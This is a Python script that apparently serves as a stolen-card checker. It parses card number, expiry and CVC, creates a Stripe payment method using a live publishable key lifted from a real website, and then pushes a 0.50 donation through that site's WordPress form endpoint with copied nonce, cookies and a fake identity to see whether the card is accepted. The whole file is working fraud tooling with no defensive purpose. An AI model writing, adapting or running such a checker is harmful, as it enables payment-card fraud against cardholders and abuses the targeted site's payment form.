import requests,re
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	r = requests.session()

	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&payment_user_agent=stripe.js%2F4901af2b6b%3B+stripe-js-v3%2F4901af2b6b%3B+card-element&key=pk_live_51MRNDIE3QRq1cyWKGH97ZrRmClVNLPXZULnopyhRr8WbGp5QnYJJMsc6ucbAzGuXGeWp3etVRThYeatiY7C8MDb900BNeCu5KH'
	
	r1 = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	
	pm = r1.json()['id']
	
	cookies = {
	    '_ga': 'GA1.1.874086042.1744420590',
	    '__stripe_mid': '38c23e46-5839-4e44-925e-833aa3c4700f9b84e1',
	    '__stripe_sid': 'd258c87e-0051-4dc4-b13b-d4bb2e2053f762d603',
	    '_ga_HB3DJBCYR6': 'GS1.1.1744420589.1.1.1744420623.0.0.0',
	}
	
	headers = {
	    'authority': 'www.authenticallymindful.com',
	    'accept': '*/*',
	    'accept-language': 'en-TH,en;q=0.9,th-DZ;q=0.8,th;q=0.7,en-GB;q=0.6,en-US;q=0.5',
	    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
	    # 'cookie': '_ga=GA1.1.874086042.1744420590; __stripe_mid=38c23e46-5839-4e44-925e-833aa3c4700f9b84e1; __stripe_sid=d258c87e-0051-4dc4-b13b-d4bb2e2053f762d603; _ga_HB3DJBCYR6=GS1.1.1744420589.1.1.1744420623.0.0.0',
	    'origin': 'https://www.authenticallymindful.com',
	    'referer': 'https://www.authenticallymindful.com/contribute/',
	    'sec-ch-ua': '"Not A(Brand";v="8", "Chromium";v="132"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36',
	    'x-requested-with': 'XMLHttpRequest',
	}
	
	params = {
	    't': '1744420624724',
	}
	
	data = {
	    'data': '__fluent_form_embded_post_id=3184&_fluentform_3_fluentformnonce=6dbb5756d9&_wp_http_referer=%2Fcontribute%2F&names%5Bfirst_name%5D=Rodam&names%5Blast_name%5D=User&email=rodamuser08%40gmail.com&payment_input=Custom%20Amount&custom-payment-amount=0.50&payment_method=stripe&item__3__fluent_checkme_=&__stripe_payment_method_id='+str(pm)+'',
	    'action': 'fluentform_submit',
	    'form_id': '3',
	}
	
	r2 = requests.post(
	    'https://www.authenticallymindful.com/wp-admin/admin-ajax.php',
	    params=params,
	    cookies=cookies,
	    headers=headers,
	    data=data,
	)
	
	return (r2.json())
